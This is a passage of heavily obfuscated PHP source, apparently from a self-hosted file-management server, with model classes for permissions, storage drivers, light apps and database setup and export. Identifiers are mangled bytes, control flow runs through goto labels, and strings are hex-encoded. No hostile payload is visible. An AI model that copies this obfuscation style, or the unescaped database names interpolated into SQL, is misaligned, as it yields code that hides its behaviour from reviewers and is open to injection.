(($Fƒà¯£•ËÏ & $a“¯ì¼æ°Ş) != $a“¯ì¼æ°Ş) { continue; } if (($Fƒà¯£•ËÏ & $AÂ‹©Ê¾Œ ) != 0) { continue; } return $a¯ó»Ğîº[$AĞ‡·¡•”[393]]; } return !1; } public function findAuthReadOnly() { $F‰‚±Æ–‡ã = self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD; $D‹Äù±æ = self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE; return $this->findAuth($F‰‚±Æ–‡ã, $D‹Äù±æ); } public function findAuthNotRead() { return $this->findAuth(0, self::AUTH_SHOW); } public function listData($F¿ŒâˆÅí÷ = false, $fÌ¶Ù—×–İ = "\x73\157\x72\164", $A©Áëœ‚±› = false) { return parent::listData($F¿ŒâˆÅí÷, $fÌ¶Ù—×–İ, $A©Áëœ‚±›); } public function update($B³Š½õèà·, $FãÏº©·) { $C”‰Ó•³‰’ =& $_SERVER[æ§›¦ÌáØ]; $b•´¼ÓŞ™º = parent::listData($B³Š½õèà·); $Dà‚§ äÂ = $this->findByName($FãÏº©·[$C”‰Ó•³‰’[28]]); if (!$b•´¼ÓŞ™º || $Dà‚§ äÂ && $Dà‚§ äÂ[$C”‰Ó•³‰’[393]] != $b•´¼ÓŞ™º[$C”‰Ó•³‰’[393]]) { return !1; } $this->filterAuth($FãÏº©·[$C”‰Ó•³‰’[406]]); return parent::update($B³Š½õèà·, $FãÏº©·); } public function remove($Fìêá®¸£å) { $eó£¯•ªŒŸ = parent::listData($Fìêá®¸£å); if (!$eó£¯•ªŒŸ || $eó£¯•ªŒŸ[$_SERVER[æ§›¦ÌáØ][1161]]) { return !1; } return parent::remove($Fìêá®¸£å); } public function add($e¹³ÑåÚ°‡ = array()) { goto d‘×¦µÓ«Ã; d‘×¦µÓ«Ã: $Eéà…¨ù« =& $_SERVER[æ§›¦ÌáØ]; if ($this->findByName($e¹³ÑåÚ°‡[$Eéà…¨ù«[28]])) { return !1; } $BÃ³Ö‚ùªö = array($Eéà…¨ù«[28] => $Eéà…¨ù«[33], $Eéà…¨ù«[406] => 1, $Eéà…¨ù«[1711] => $Eéà…¨ù«[1699], $Eéà…¨ù«[1710] => 1, $Eéà…¨ù«[1161] => 0, $Eéà…¨ù«[1712] => 0); goto Fè¥ª×Ğ½ê; cäÇ¶—­êµ: return parent::insert($e¹³ÑåÚ°‡); goto FòèéŸ; Fè¥ª×Ğ½ê: $e¹³ÑåÚ°‡ = array_merge($BÃ³Ö‚ùªö, $e¹³ÑåÚ°‡); $e¹³ÑåÚ°‡[$Eéà…¨ù«[1712]] = $this->getSort(); $this->filterAuth($e¹³ÑåÚ°‡[$Eéà…¨ù«[406]]); goto cäÇ¶—­êµ; FòèéŸ: } private function getSort() { $A¾ïÔÓµ‡Ô =& $_SERVER[æ§›¦ÌáØ]; $aô„®ÌõÕº = parent::listData(); $CœÜ¢ÃÓ›ª = array_to_keyvalue($aô„®ÌõÕº, $A¾ïÔÓµ‡Ô[33], $A¾ïÔÓµ‡Ô[1712]); return empty($CœÜ¢ÃÓ›ª) ? 0 : max($CœÜ¢ÃÓ›ª) + 1; } private function filterAuth(&$b­ì Ñ’¬«) { goto c¼Š‹Úãƒ½; cœ¿¬ñÁ±º: foreach ($EÓÃÙ°÷ƒÖ as $Föóâ™ÆÕÚ) { if ($b­ì Ñ’¬« & $Föóâ™ÆÕÚ) { $D³Œ‘â½Ã[] = $Föóâ™ÆÕÚ; } } if (in_array(self::AUTH_ROOT, $D³Œ‘â½Ã)) { $b­ì Ñ’¬« = array_sum($EÓÃÙ°÷ƒÖ); return; } $EÎå¾±Çñë = array(self::AUTH_DOWNLOAD => array(self::AUTH_VIEW), self::AUTH_EDIT => array(self::AUTH_VIEW), self::AUTH_REMOVE => array(self::AUTH_EDIT), self::AUTH_SHARE => array(self::AUTH_VIEW, self::AUTH_DOWNLOAD, self::AUTH_UPLOAD, self::AUTH_EDIT)); goto dÀŞëàö­»; dÀŞëàö­»: foreach ($D³Œ‘â½Ã as $Föóâ™ÆÕÚ) { if (isset($EÎå¾±Çñë[$Föóâ™ÆÕÚ])) { $D³Œ‘â½Ã = array_merge($D³Œ‘â½Ã, $EÎå¾±Çñë[$Föóâ™ÆÕÚ]); } } $D³Œ‘â½Ã[] = self::AUTH_SHOW; $b­ì Ñ’¬« = array_sum(array_unique($D³Œ‘â½Ã)); goto b­Ÿ”‰ê‘¹; c¼Š‹Úãƒ½: if (!$b­ì Ñ’¬«) { return; } $EÓÃÙ°÷ƒÖ = array(self::AUTH_SHOW, self::AUTH_VIEW, self::AUTH_DOWNLOAD, self::AUTH_UPLOAD, self::AUTH_EDIT, self::AUTH_REMOVE, self::AUTH_SHARE, self::AUTH_COMMENT, self::AUTH_EVENT, self::AUTH_ROOT); $D³Œ‘â½Ã = array(); goto cœ¿¬ñÁ±º; b­Ÿ”‰ê‘¹: } public function sort($fÇ´®®†·–, $B¼Ü‘™®¨) { return parent::update($fÇ´®®†·–, $B¼Ü‘™®¨); } } goto f„êá¨šƒ; C„«í«ª¶¿: class SourceSecretModel extends ModelBaseLight { public $optionType = "\123\171\163\164\x65\x6d\56\163\157\165\162\143\x65\123\x65\143\162\145\164\114\x69\163\164"; public $field = array("\x73\x6f\165\x72\143\x65\x49\104", "\x74\x79\160\145\111\104", "\143\162\x65\x61\x74\145\x55\163\145\x72"); } class StorageModel extends ModelBaseLight { public $optionType = "\x53\171\x73\x74\x65\x6d\56\163\x74\157\x72\141\147\x65\114\151\163\164"; public $field = array("\156\141\155\x65", "\163\x69\172\x65\x4d\141\x78", "\163\x79\163\164\145\x6d", "\144\x65\x66\141\x75\x6c\164", "\144\162\151\x76\145\x72", "\x63\x6f\156\x66\x69\x67"); public function listData($C˜²²´ùôÖ = false, $C¨Œô©Á»¡ = "\x6d\x6f\144\151\x66\x79\124\151\x6d\x65", $Aâ¦ã‡‘…² = false) { $Aˆ‡¦Á®å =& $_SERVER[æ§›¦ÌáØ]; $CŠÔ…¡ëã‡ = parent::listData($C˜²²´ùôÖ, $C¨Œô©Á»¡, $Aâ¦ã‡‘…²); if ($C˜²²´ùôÖ) { return $CŠÔ…¡ëã‡; } $cÉ¿‚Ğšõ = $this->ioSizeUseGet(array_to_keyvalue($CŠÔ…¡ëã‡, $Aˆ‡¦Á®å[33], $Aˆ‡¦Á®å[393])); foreach ($CŠÔ…¡ëã‡ as $e¶œ®í¬¶’ => $Eö»‡²Ğº) { unset($CŠÔ…¡ëã‡[$e¶œ®í¬¶’][$Aˆ‡¦Á®å[6]]); $CŠÔ…¡ëã‡[$e¶œ®í¬¶’][$Aˆ‡¦Á®å[1675]] = isset($cÉ¿‚Ğšõ[$Eö»‡²Ğº[$Aˆ‡¦Á®å[393]]]) ? $cÉ¿‚Ğšõ[$Eö»‡²Ğº[$Aˆ‡¦Á®å[393]]] : 0; } return $CŠÔ…¡ëã‡; } public function ioSizeUseGet($DÚ“…º‚Ó) { goto dƒ¥Ê¢­›; aÑµƒ¼òñô: Cache::set($c‰¶…–¦ÕÉ, $eÍÇ…Æ®à, 600); return $eÍÇ…Æ®à; goto CÉ‰»¬ì˜ï; f•ƒŒ¹‰Ş—: $a›ÕîÇ†–™ = array($D†±‰Âˆª¢[775] => array($D†±‰Âˆª¢[7], $DÚ“…º‚Ó)); $eÍÇ…Æ®à = Model($D†±‰Âˆª¢[740])->field($aè¬†æù†À)->where($a›ÕîÇ†–™)->group($D†±‰Âˆª¢[775])->select(); $eÍÇ…Æ®à = array_to_keyvalue($eÍÇ…Æ®à, $D†±‰Âˆª¢[393], $D†±‰Âˆª¢[78]); goto aÑµƒ¼òñô; C¼»èø‹Ğ©: $eÍÇ…Æ®à = Cache::get($c‰¶…–¦ÕÉ); if ($eÍÇ…Æ®à) { return $eÍÇ…Æ®à; } $aè¬†æù†À = array($D†±‰Âˆª¢[775] => $D†±‰Âˆª¢[393], $D†±‰Âˆª¢[1988] => $D†±‰Âˆª¢[78]); goto f•ƒŒ¹‰Ş—; dƒ¥Ê¢­›: $D†±‰Âˆª¢ =& $_SERVER[æ§›¦ÌáØ]; if (!$DÚ“…º‚Ó) { return array(); } $c‰¶…–¦ÕÉ = $D†±‰Âˆª¢[1987] . implode($D†±‰Âˆª¢[47], $DÚ“…º‚Ó); goto C¼»èø‹Ğ©; CÉ‰»¬ì˜ï: } public function getConfig($Cƒª”ƒÏß‚) { $c¸Ş±œÏ† = parent::listData($Cƒª”ƒÏß‚); return json_decode($c¸Ş±œÏ†[$_SERVER[æ§›¦ÌáØ][6]], !0); } public function update($f¦»áã÷÷¤, $e¼ÕÔ»ØÃº) { goto a™ŸÖç‹†; dƒ«ÎÀº›­: $DÎÔ•Ä‰Û = parent::update($f¦»áã÷÷¤, $e¼ÕÔ»ØÃº); if ($DÎÔ•Ä‰Û && $e¼ÕÔ»ØÃº[$FÀÉÆÀ…ñœ[34]]) { foreach ($Eí»‡±œÂ as $d§ªÏõÀÆé) { if ($d§ªÏõÀÆé[$FÀÉÆÀ…ñœ[34]] && $d§ªÏõÀÆé[$FÀÉÆÀ…ñœ[393]] != $f¦»áã÷÷¤) { parent::update($d§ªÏõÀÆé[$FÀÉÆÀ…ñœ[393]], array($FÀÉÆÀ…ñœ[34] => 0)); } } } return $DÎÔ•Ä‰Û; goto cÕªï‡ íà; fÅöñÔ¹Œ: if (isset($Eí»‡±œÂ[$F„¶¢ˆ¬­]) && $Eí»‡±œÂ[$F„¶¢ˆ¬­][$FÀÉÆÀ…ñœ[393]] != $f¦»áã÷÷¤) { return !1; } if (isset($e¼ÕÔ»ØÃº[$FÀÉÆÀ…ñœ[1989]]) && $e¼ÕÔ»ØÃº[$FÀÉÆÀ…ñœ[1989]] == $FÀÉÆÀ…ñœ[87]) { $this->checkConfig($e¼ÕÔ»ØÃº); } unset($e¼ÕÔ»ØÃº[$FÀÉÆÀ…ñœ[1989]]); goto dƒ«ÎÀº›­; a™ŸÖç‹†: $FÀÉÆÀ…ñœ =& $_SERVER[æ§›¦ÌáØ]; $F„¶¢ˆ¬­ = $e¼ÕÔ»ØÃº[$FÀÉÆÀ…ñœ[28]]; $Eí»‡±œÂ = array_to_keyvalue(parent::listData(), $FÀÉÆÀ…ñœ[28]); goto fÅöñÔ¹Œ; cÕªï‡ íà: } public function add($båÑ»¡Æ„ø) { goto fÄöºÑ„ä; fÉù·èÛ„Ù: return $fï¾à¥»; goto D‚…ŠÓĞõ; d­ŒîÅê¬¨: $this->checkConfig($båÑ»¡Æ„ø); $fï¾à¥» = parent::insert($båÑ»¡Æ„ø); if ($fï¾à¥» && $båÑ»¡Æ„ø[$C­ƒ‹ØŸòé[34]]) { foreach ($Eª¢ùŸí‹º as $CŠæÊÏ³°) { if ($CŠæÊÏ³°[$C­ƒ‹ØŸòé[34]]) { parent::update($CŠæÊÏ³°[$C­ƒ‹ØŸòé[393]], array($C­ƒ‹ØŸòé[34] => 0)); } } } goto fÉù·èÛ„Ù; fÄöºÑ„ä: $C­ƒ‹ØŸòé =& $_SERVER[æ§›¦ÌáØ]; $Eª¢ùŸí‹º = array_to_keyvalue(parent::listData(), $C­ƒ‹ØŸòé[28]); if (isset($Eª¢ùŸí‹º[$båÑ»¡Æ„ø[$C­ƒ‹ØŸòé[28]]])) { return !1; } goto d­ŒîÅê¬¨; D‚…ŠÓĞõ: } public function checkConfig(&$A›£†ÑåŸ‘, $F¿Œ˜ÆÂØÏ = false) { goto FÂ³Èè‘Ë‚; E¾…¡è·: $D®äŠ£ÕÕŒ = new $b‡µ‘–ã„($D…İÄ‰Ï¶); if (in_array($EÎ‡Ë›ÂÂ, $D®äŠ£ÕÕŒ->objectDriver)) { if (!$D®äŠ£ÕÕŒ->isBucketCors() && !$D®äŠ£ÕÕŒ->setBucketCors()) { $bÇªÏ÷É¶² = LNG($eÔõ¸ÆÁæ£[1994]); $bÇªÏ÷É¶² .= $eÔõ¸ÆÁæ£[1995] . LNG($eÔõ¸ÆÁæ£[1996]); if ($F¿Œ˜ÆÂØÏ) { return $bÇªÏ÷É¶²; } show_json($bÇªÏ÷É¶², !1); } } $f÷À÷£±¿ = rtrim($D…İÄ‰Ï¶[$eÔõ¸ÆÁæ£[1066]], $eÔõ¸ÆÁæ£[8]) . $eÔõ¸ÆÁæ£[8]; goto cëñâÑŒ; cëñâÑŒ: $bó±ˆˆœª› = $D®äŠ£ÕÕŒ->getPath($f÷À÷£±¿ . $eÔõ¸ÆÁæ£[1128]); if (!$D®äŠ£ÕÕŒ->mkfile($bó±ˆˆœª›)) { if ($F¿Œ˜ÆÂØÏ) { return LNG($eÔõ¸ÆÁæ£[1994]); } show_json(LNG($eÔõ¸ÆÁæ£[1994]), !1); } $D…İÄ‰Ï¶[$eÔõ¸ÆÁæ£[1066]] = $f÷À÷£±¿; goto fé¯¾Ñ¡©; F—ÓŠÌ˜„: $dä‰ì¦²Ô­ = isset($aÌ…Ô¦Ã÷á[$EÎ‡Ë›ÂÂ]) ? $aÌ…Ô¦Ã÷á[$EÎ‡Ë›ÂÂ] : ucfirst($EÎ‡Ë›ÂÂ); $b‡µ‘–ã„ = $eÔõ¸ÆÁæ£[72] . $dä‰ì¦²Ô­; if (!$dä‰ì¦²Ô­ || !class_exists($b‡µ‘–ã„)) { if ($F¿Œ˜ÆÂØÏ) { return LNG($eÔõ¸ÆÁæ£[1991]); } write_log(array($eÔõ¸ÆÁæ£[1992], $A›£†ÑåŸ‘, get_caller_info()), $eÔõ¸ÆÁæ£[1993]); show_json(LNG($eÔõ¸ÆÁæ£[1991]), !1, $A›£†ÑåŸ‘); } goto E¾…¡è·; fé¯¾Ñ¡©: $A›£†ÑåŸ‘[$eÔõ¸ÆÁæ£[6]] = json_encode($D…İÄ‰Ï¶); $A›£†ÑåŸ‘[$eÔõ¸ÆÁæ£[94]] = $dä‰ì¦²Ô­; return !0; goto E™†ˆ¨Ï¸; FÂ³Èè‘Ë‚: $eÔõ¸ÆÁæ£ =& $_SERVER[æ§›¦ÌáØ]; $EÎ‡Ë›ÂÂ = strtolower($A›£†ÑåŸ‘[$eÔõ¸ÆÁæ£[94]]); $D…İÄ‰Ï¶ = json_decode($A›£†ÑåŸ‘[$eÔõ¸ÆÁæ£[6]], !0); goto D¼¼¡›îŒ; D¼¼¡›îŒ: foreach ($D…İÄ‰Ï¶ as $fİ¯©»Â­ => $BÍöÁ‘Ú¾­) { $D…İÄ‰Ï¶[$fİ¯©»Â­] = trim($BÍöÁ‘Ú¾­); } $D…İÄ‰Ï¶[$eÔõ¸ÆÁæ£[1990]] = rand_string(6); $aÌ…Ô¦Ã÷á = $GLOBALS[$eÔõ¸ÆÁæ£[6]][$eÔõ¸ÆÁæ£[88]][$eÔõ¸ÆÁæ£[784]]; goto F—ÓŠÌ˜„; E™†ˆ¨Ï¸: } public function driverListSystem() { $eª™³‚±ĞË =& $_SERVER[æ§›¦ÌáØ]; $ağ–Õë‘ÎÆ = parent::listData(); $eÖïÅøÂ = array(); foreach ($ağ–Õë‘ÎÆ as $d½ÌÚÙëÌ) { unset($d½ÌÚÙëÌ[$eª™³‚±ĞË[194]], $d½ÌÚÙëÌ[$eª™³‚±ĞË[84]]); $d½ÌÚÙëÌ[$eª™³‚±ĞË[6]] = json_decode($d½ÌÚÙëÌ[$eª™³‚±ĞË[6]], !0); $eÖïÅøÂ[] = $d½ÌÚÙëÌ; } return $eÖïÅøÂ; } public function defaultDriver() { $c°ë§ò =& $_SERVER[æ§›¦ÌáØ]; $aù¿È ĞÔ’ = parent::listData(); $AÅä°’×„ó = array_filter_by_field($aù¿È ĞÔ’, $c°ë§ò[34], 1); $AÅä°’×„ó = $AÅä°’×„ó[0]; if ($AÅä°’×„ó) { $AÅä°’×„ó[$c°ë§ò[6]] = json_decode($AÅä°’×„ó[$c°ë§ò[6]], !0); } return $AÅä°’×„ó; } public function driverInfo($b†˜İ£Ô¸§) { $eŒ¿—õ‘âÖ =& $_SERVER[æ§›¦ÌáØ]; $CøÍÄì’ = array_to_keyvalue(parent::listData(), $eŒ¿—õ‘âÖ[393]); if (!isset($CøÍÄì’[$b†˜İ£Ô¸§])) { return !1; } $báƒİÖËæ = $CøÍÄì’[$b†˜İ£Ô¸§]; $báƒİÖËæ[$eŒ¿—õ‘âÖ[6]] = json_decode($báƒİÖËæ[$eŒ¿—õ‘âÖ[6]], !0); return $báƒİÖËæ; } public function remove($dë¬ä÷Á§›) { $this->removeShareItems($dë¬ä÷Á§›); return parent::remove($dë¬ä÷Á§›); } public function removeWithFile($dãÊÖ«ã¤, $Eˆ®¦‚¬ì©) { goto bŞ…Ç¨…ƒ; a¸¿ËŠğğ: $bğ°Œ‘‚ä = Model($cí°È¿…§[450])->where($fŒ£™÷äîæ)->sum($cí°È¿…§[78]); $c×ò§¬†å = $Eˆ®¦‚¬ì© . $cí°È¿…§[1997] . $dãÊÖ«ã¤; $cÈÁ˜ìöÖ† = new TaskFileTransfer($c×ò§¬†å, $cí°È¿…§[1993], $dÊ–ÂŞ„î, LNG($cí°È¿…§[1998]) . "\x28{$dãÊÖ«ã¤}\51"); goto EåªßæùÆŸ; EåªßæùÆŸ: $cÈÁ˜ìöÖ†->task[$cí°È¿…§[716]] = (double) $bğ°Œ‘‚ä; $FâòÉ‡À¦Ö = KodIO::defaultDriver(); $AÈßË‚¦‚ = $FâòÉ‡À¦Ö[$cí°È¿…§[393]]; goto C†¨ß¾Ü¼; eƒå„ñ…‚á: $AŞ¹ŒÓ”¹ = Model($cí°È¿…§[193])->where($fŒ£™÷äîæ)->field($cí°È¿…§[1999])->select(); foreach ($AŞ¹ŒÓ”¹ as $båÅ²²ÜØÚ) { goto døãÔ±ôÃ†; FØñïØÄ„›: $B•«Ğß•§â = array($cí°È¿…§[775] => $AÈßË‚¦‚, $cí°È¿…§[76] => $dáô÷İ…); Model($cí°È¿…§[193])->where($fŒ£™÷äîæ)->save($B•«Ğß•§â); goto BÆ½²ª‘îƒ; dÔ‡ÖŞ¥ª: if (IO::exist($dáô÷İ…)) { $cÈÁ˜ìöÖ†->updateFileEnd($båÅ²²ÜØÚ[$cí°È¿…§[28]], $båÅ²²ÜØÚ[$cí°È¿…§[78]]); continue; } if (!IO::move($EËó×¨˜“¶, get_path_father($dáô÷İ…))) { $CØ¨¿àÌ¶ä = !1; break; } $fŒ£™÷äîæ = array($cí°È¿…§[447] => $båÅ²²ÜØÚ[$cí°È¿…§[447]]); goto FØñïØÄ„›; døãÔ±ôÃ†: $EËó×¨˜“¶ = $båÅ²²ÜØÚ[$cí°È¿…§[76]]; $dáô÷İ… = $aì×•ØÃÍ . str_replace("\x7b\151\x6f\x3a{$dãÊÖ«ã¤}\x7d\57", $cí°È¿…§[33], $EËó×¨˜“¶); if (!IO::exist($EËó×¨˜“¶)) { $F‘õ¿ò‘â[] = $båÅ²²ÜØÚ[$cí°È¿…§[447]]; $cÈÁ˜ìöÖ†->updateFileEnd($båÅ²²ÜØÚ[$cí°È¿…§[28]], $båÅ²²ÜØÚ[$cí°È¿…§[78]]); continue; } goto dÔ‡ÖŞ¥ª; BÆ½²ª‘îƒ: } $this->removeByFileID($F‘õ¿ò‘â); goto a¶ÒãÚ‡³¬; a¶ÒãÚ‡³¬: if (!$CØ¨¿àÌ¶ä) { $cÈÁ˜ìöÖ†->stop($c×ò§¬†å); return !1; } $cÈÁ˜ìöÖ†->end(); if ($Eˆ®¦‚¬ì© == $cí°È¿…§[1655]) { $this->remove($dãÊÖ«ã¤); } goto e©ÆÚÌ½Õå; bŞ…Ç¨…ƒ: $cí°È¿…§ =& $_SERVER[æ§›¦ÌáØ]; $fŒ£™÷äîæ = array($cí°È¿…§[775] => $dãÊÖ«ã¤); $dÊ–ÂŞ„î = Model($cí°È¿…§[450])->where($fŒ£™÷äîæ)->count(); goto a¸¿ËŠğğ; C†¨ß¾Ü¼: $aì×•ØÃÍ = "\x7b\x69\157\72{$AÈßË‚¦‚}\x7d\57"; $CØ¨¿àÌ¶ä = !0; $F‘õ¿ò‘â = array(); goto eƒå„ñ…‚á; e©ÆÚÌ½Õå: } public function progress($b‡±øíº, $aìŸ„Úğì½) { return Task::get($aìŸ„Úğì½ . $_SERVER[æ§›¦ÌáØ][1997] . $b‡±øíº); } private function removeByFileID($eãïĞªĞÔ = array()) { goto DèŠÊ¨Ù; DèŠÊ¨Ù: $EÁ°ùêÁà =& $_SERVER[æ§›¦ÌáØ]; if (empty($eãïĞªĞÔ)) { return; } $E½™ àÏÄŞ = array($EÁ°ùêÁà[447] => array($EÁ°ùêÁà[7], $eãïĞªĞÔ)); goto c¦¸¹ø¯ °; a–äŒà‘ğ: foreach ($bù¨¬ ò´« as $eÍ†¸¬ß¨İ) { Model($EÁ°ùêÁà[409])->removeNow($eÍ†¸¬ß¨İ, !1); } goto d¤£¡óôó; c¦¸¹ø¯ °: $bù¨¬ ò´« = Model($EÁ°ùêÁà[1196])->where($E½™ àÏÄŞ)->field($EÁ°ùêÁà[395])->select(); if (!$bù¨¬ ò´«) { return; } $bù¨¬ ò´« = array_to_keyvalue($bù¨¬ ò´«, $EÁ°ùêÁà[33], $EÁ°ùêÁà[395]); goto a–äŒà‘ğ; d¤£¡óôó: } private function removeShareItems($FÁö—Ó›¦Ğ) { goto DÏææ²‡È‡; B‹…†ÙÏ£: Model($Aä»º‚š•[576])->remove($dÏ‹öá©¢); goto d××ç²Ø”®; bø”Í„ë‡‘: $d¤®ÂÅ¹³¡ = Model($Aä»º‚š•[1666])->where($CÛé÷ùëÁâ)->field($Aä»º‚š•[468])->select(); if (empty($d¤®ÂÅ¹³¡)) { return; } $dÏ‹öá©¢ = array_to_keyvalue($d¤®ÂÅ¹³¡, $Aä»º‚š•[33], $Aä»º‚š•[468]); goto B‹…†ÙÏ£; DÏææ²‡È‡: $Aä»º‚š• =& $_SERVER[æ§›¦ÌáØ]; $dŠ¥Ù³Í¦ = "\173\x69\157\x3a{$FÁö—Ó›¦Ğ}\x7d\x2f"; $CÛé÷ùëÁâ = array($Aä»º‚š•[395] => 0, $Aä»º‚š•[1061] => array($Aä»º‚š•[380], "{$dŠ¥Ù³Í¦}\x25")); goto bø”Í„ë‡‘; d××ç²Ø”®: } } class SystemLightAppModel extends ModelBaseLight { public $optionType = "\123\x79\163\164\x65\155\56\x4c\x69\147\150\x74\101\160\x70"; public $modelType = "\123\x79\163\x74\145\155\117\160\x74\151\157\156"; public $field = array("\156\x61\x6d\145", "\x67\162\x6f\165\160", "\144\145\x73\x63", "\x63\x6f\x6e\x74\145\x6e\164"); public function listData($B¨Ö–Ö½Õ = false, $a¤–”çÅŠ… = "\155\157\x64\151\146\171\124\x69\155\x65", $a×á†„©¾Ë = true) { return parent::listData($B¨Ö–Ö½Õ, $a¤–”çÅŠ…, $a×á†„©¾Ë); } public function remove($aÉ§Ò›¦ó·) { $C›Ê´æš×ƒ = $this->findByName($aÉ§Ò›¦ó·); if (!$C›Ê´æš×ƒ) { return !1; } return parent::remove($C›Ê´æš×ƒ[$_SERVER[æ§›¦ÌáØ][393]]); } public function add($EÆ—„éË¤) { if ($this->findByName($EÆ—„éË¤[$_SERVER[æ§›¦ÌáØ][28]])) { return !1; } return parent::insert($EÆ—„éË¤); } public function update($a–ßßğ¸Ò, $cÀåçÆ¸¨) { $bÖ§§¯Ì²Î =& $_SERVER[æ§›¦ÌáØ]; $d²±ÉùİîÊ = $this->findByName($a–ßßğ¸Ò); $bàãßáÙå = $this->findByName($cÀåçÆ¸¨[$bÖ§§¯Ì²Î[28]]); if (!$d²±ÉùİîÊ || $bàãßáÙå && $bàãßáÙå[$bÖ§§¯Ì²Î[393]] != $d²±ÉùİîÊ[$bÖ§§¯Ì²Î[393]]) { return !1; } return parent::update($d²±ÉùİîÊ[$bÖ§§¯Ì²Î[393]], $cÀåçÆ¸¨); } } goto cÉÕÔ¤»àÜ; bªˆ£íÙ—›: class DbManage { function __construct($dâŒĞí¢“, $c¹øÑ’ƒê = '') { $this->database = $dâŒĞí¢“; $this->type = $c¹øÑ’ƒê; } public function model($C‚ÚëÊ = '') { return new ModelBase($C‚ÚëÊ, $_SERVER[æ§›¦ÌáØ][33], $this->database); } public function db($F»ªï°²´ã = false) { goto fçÑÉÍâù¤; Eõ¾â¯Ø÷ : $this->database = $C¿“¿§…Ö§; $dĞ®Ç®ô†İ = $this->model()->db(); try { $e„–µßĞ = $dĞ®Ç®ô†İ->execute("\163\150\x6f\167\40\x64\x61\164\x61\x62\141\163\x65\x73\40\x6c\151\x6b\145\40\47{$b°©Â•ÄÉ}\x27"); } catch (Exception $Eòóº°×Òé) { } goto eÒ£¥È×†Ÿ; a‡°ÀòŞàÜ: $this->database = $C¿“¿§…Ö§; $dĞ®Ç®ô†İ->execute("\165\163\x65\x20\x60{$b°©Â•ÄÉ}\140"); return $dĞ®Ç®ô†İ; goto bšÕ¦‹›ÊÛ; BÖŸ»„‡±: $b°©Â•ÄÉ = $C¿“¿§…Ö§[$c’ˆª§…¦ô[920]]; $C¿“¿§…Ö§[$c’ˆª§…¦ô[920]] = $c’ˆª§…¦ô[33]; if ($C¿“¿§…Ö§[$c’ˆª§…¦ô[747]] == $c’ˆª§…¦ô[748]) { $E”ŞøÜ¼§š = $C¿“¿§…Ö§[$c’ˆª§…¦ô[749]]; $C¿“¿§…Ö§[$c’ˆª§…¦ô[749]] = substr($E”ŞøÜ¼§š, 0, strrpos($E”ŞøÜ¼§š, $c’ˆª§…¦ô[1007])); } goto Eõ¾â¯Ø÷ ; fçÑÉÍâù¤: $c’ˆª§…¦ô =& $_SERVER[æ§›¦ÌáØ]; $C¿“¿§…Ö§ = array_change_key_case($this->database); if ($this->type == $c’ˆª§…¦ô[9] || !$F»ªï°²´ã) { return $this->model()->db(); } goto BÖŸ»„‡±; eÒ£¥È×†Ÿ: if (!$e„–µßĞ) { $dĞ®Ç®ô†İ->execute("\x63\x72\x65\141\x74\145\40\144\x61\164\x61\x62\141\163\145\x20\x60{$b°©Â•ÄÉ}\x60"); } $C¿“¿§…Ö§[$c’ˆª§…¦ô[920]] = $b°©Â•ÄÉ; if ($C¿“¿§…Ö§[$c’ˆª§…¦ô[747]] == $c’ˆª§…¦ô[748]) { $C¿“¿§…Ö§[$c’ˆª§…¦ô[749]] .= $c’ˆª§…¦ô[1007] . $b°©Â•ÄÉ; } goto a‡°ÀòŞàÜ; bšÕ¦‹›ÊÛ: } public function createTable($BŸìµëºÚÚ, $eøç¶®µë = null) { $fò ¼„Ù®“ =& $_SERVER[æ§›¦ÌáØ]; if (!IO::exist($BŸìµëºÚÚ)) { ActionCall($fò ¼„Ù®“[1008], !0, 0); show_json(LNG($fò ¼„Ù®“[1009]), !1); } $Có‹ñÙ„” = sqlSplit(IO::getContent($BŸìµëºÚÚ)); foreach ($Có‹ñÙ„” as $d‚¡Ü’÷ˆá) { if ($eøç¶®µë) { $E’ šÖ‚äœ = stripos($d‚¡Ü’÷ˆá, $fò ¼„Ù®“[1010]) === 0; if ($E’ šÖ‚äœ) { $eøç¶®µë->task[$fò ¼„Ù®“[1011]] += 1; } } $this->model()->db()->execute($d‚¡Ü’÷ˆá); if ($eøç¶®µë && $E’ šÖ‚äœ) { preg_match($fò ¼„Ù®“[1012], $d‚¡Ü’÷ˆá, $E°Ã’ğÒÒÚ); $eøç¶®µë->task[$fò ¼„Ù®“[1013]] = $E°Ã’ğÒÒÚ[1]; $eøç¶®µë->update(1); } } $this->taskToCache($eøç¶®µë); } public function insertTable($eò¤‹ô¾çî, $bÑÈ½·„‡ = null) { $cÍóáˆã =& $_SERVER[æ§›¦ÌáØ]; $bĞ”Æ‚áñº = $this->model()->db(); $c²ä®­¬› = $C¡±­é Ğ³ ? array($C¡±­é Ğ³) : $bĞ”Æ‚áñº->getTables(); foreach ($eò¤‹ô¾çî as $Bèéñ«Š÷é) { $C¡±­é Ğ³ = basename($Bèéñ«Š÷é, $cÍóáˆã[739]); if (!in_array($C¡±­é Ğ³, $c²ä®­¬›)) { continue; } if ($bÑÈ½·„‡) { $bÑÈ½·„‡->task[$cÍóáˆã[1013]] = $C¡±­é Ğ³; } if (get_filesize($Bèéñ«Š÷é) == 0) { continue; } $d‚ˆÅˆ¨¶ = $this->sqlToDb($Bèéñ«Š÷é, $bÑÈ½·„‡); if (!$d‚ˆÅˆ¨¶) { ActionCall($cÍóáˆã[1008], !0, 0); show_json(LNG($cÍóáˆã[1014]) . "\133{$C¡±­é Ğ³}\x5d", !1); } } $this->taskToCache($bÑÈ½·„‡); } public function sqlFromDb($eŒ…Œ×Æà‘, $fˆ×£ïæ, $AÓ¼ç÷æİ = null, $c ¬Å”„¬Å = null) { goto d›‘á¼äÓ; FÜÑ‡î³¹¡: $Eó”øñ‰•Ë = $AÏ’Îœƒ˜->getPk(); $C“¿êÅÙ¾Ö = $AÏ’Îœƒ˜->getDbFields(); do { $eÒ´¨¢âã— = array($Eó”øñ‰•Ë => array($_SERVER[æ§›¦ÌáØ][962], $F¬Ò©Ş¢½«)); $Dáòƒ’œàù = $AÏ’Îœƒ˜->where($eÒ´¨¢âã—)->field($C“¿êÅÙ¾Ö)->order($Eó”øñ‰•Ë . $_SERVER[æ§›¦ÌáØ][1016])->limit($fåØÉšÇ‘Ô)->select(); $Dáòƒ’œàù = !empty($Dáòƒ’œàù) ? $Dáòƒ’œàù : array(); if (!($dàãà·¼ = count($Dáòƒ’œàù))) { break; } $D…îÍæ¦² = end($Dáòƒ’œàù); $F¬Ò©Ş¢½« = $D…îÍæ¦²[$Eó”øñ‰•Ë]; $båÌÄÍÀÒâ = array(); foreach ($Dáòƒ’œàù as $B»ËŠÌ»’) { if ($eŒ…Œ×Æà‘ == $_SERVER[æ§›¦ÌáØ][1017] && 